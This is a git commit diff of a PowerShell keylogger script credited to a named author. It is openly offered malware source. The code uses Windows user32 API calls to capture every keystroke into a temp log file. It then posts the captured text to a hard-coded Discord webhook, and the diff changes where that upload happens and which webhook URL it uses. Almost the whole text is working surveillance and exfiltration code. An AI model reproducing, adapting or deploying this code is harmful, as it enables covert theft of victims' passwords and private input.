3522864951ab1a8753a2e7c8d664eee51c7f54c3
Syke <42148690+ISykeI@users.noreply.github.com>
2022-02-10 15:20:33 +0200

    Update keylog.ps1

--- keylog.ps1
+++ keylog.ps1
@@ -1,17 +1,14 @@
 # MADE BY SYKE
 # Discord: syke#1166 / Syke#1166
 
-
 # keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+function KeyLogger($logFile="$env:temp/keylogger.log") {
 
-  # generate log file
-  $generateLog = New-Item -Path $logFile -ItemType File -Force
 
-  # API signatures
-  $APIsignatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
-public static extern short GetAsyncKeyState(int virtualKeyCode);
+   # Signatures for API Calls
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int GetKeyboardState(byte[] keystate);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -20,52 +17,62 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
- # set up API
- $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
-
-    $webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
-    $Body = @{
+  # load signatures and make members available
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    
+    $generateLog = New-Item -Path $logFile -ItemType File -Force
   
-  'content' = get-content $env:temp/keylogger.log
-    }
-
-  # attempt to log keystrokes
-  
+  try{
     while ($true) {
+
       Start-Sleep -Milliseconds 40
-
+      
+      # scan all ASCII codes above 8
       for ($ascii = 9; $ascii -le 254; $ascii++) {
+        # get current key state
+        $state = $API::GetAsyncKeyState($ascii)
 
-        # use API to get key state
-        $keystate = $API::GetAsyncKeyState($ascii)
+        # is key pressed?
+        if ($state -eq -32767) {
+          $generateLog = [console]::CapsLock
 
-        # use API to detect keystroke
-        if ($keystate -eq -32767) {
-          $null = [console]::CapsLock
+          # translate scan code to real code
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-          # map virtual key
-          $mapKey = $API::MapVirtualKey($ascii, 3)
+          # get keyboard state for virtual keys
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
 
-          # create a stringbuilder
-          $keyboardState = New-Object Byte[] 256
-          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
-          $loggedchar = New-Object -TypeName System.Text.StringBuilder
+          # prepare a StringBuilder to receive input key
+          $mychar = New-Object -TypeName System.Text.StringBuilder
 
           # translate virtual key
-          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
-            # add logged key to file
-            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
-             
-            }
-             }
-             
-             Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
-             Start-Sleep -Seconds 30
-         }
-     }
-  }
-  
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+           
 
+          if ($success) 
+          {
+            # add key to logger file
+            [System.IO.File]::AppendAllText($logFile, $mychar, [System.Text.Encoding]::Unicode) 
+          }
+          
+        }
+      }
+    }
+  }
+
+  finally {
+    
+        
+     $webhookUri = 'https://discord.com/api/webhooks/941322499986190466/ehCY6Aczy1BD39n5ukLpXrfg45vGb8qWYoWUr3_l3EBTJenVuVevW21gprFZC4_F4Y87'
+    $Body = @{
+  
+        'content' = get-content $env:temp/keylogger.log
+        }
+      Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+
+  }
+}
 
 
 # run keylogger
